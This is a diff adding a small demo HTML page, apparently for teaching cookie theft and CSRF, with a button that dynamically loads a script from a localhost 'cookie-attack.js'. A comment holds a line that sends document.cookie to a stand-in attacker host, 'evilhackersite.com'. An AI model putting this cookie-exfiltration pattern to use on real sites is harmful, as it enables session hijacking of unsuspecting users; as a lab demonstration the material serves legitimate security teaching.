@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Evil Webpage</title>
+  </head>
+  <body>
+    <p>The onclick event triggers a function that steals cookies.</p>
+    <p>
+      Click to trigger a change pasword function that will send your cookies to
+      an attacker. Look at the
+    </p>
+
+    <button onclick="getScript('https://localhost:9381/csrf/cookie-attack.js')">
+      Click me
+    </button>
+
+    <script>
+      document.cookie = "username=John Doe; SameSite=None; Secure;path=/";
+    </script>
+    <!--  
+          Will call script that posts cookie to attacker website 
+          <script src="cookie-attack.js"></script>   
+           document.location =
+          "http://evilhackersite.com/?cookie=" + "%22" + document.cookie + "%22";  
+    -->
+    <script type="text/javascript">
+      getScript = (url) => {
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        script.setAttribute("src", url);
+        if (document.body == null) {
+          document.head.appendChild(script);
+        } else {
+          document.body.appendChild(script);
+        }
+      };
+    </script>
+  </body>
+</html>
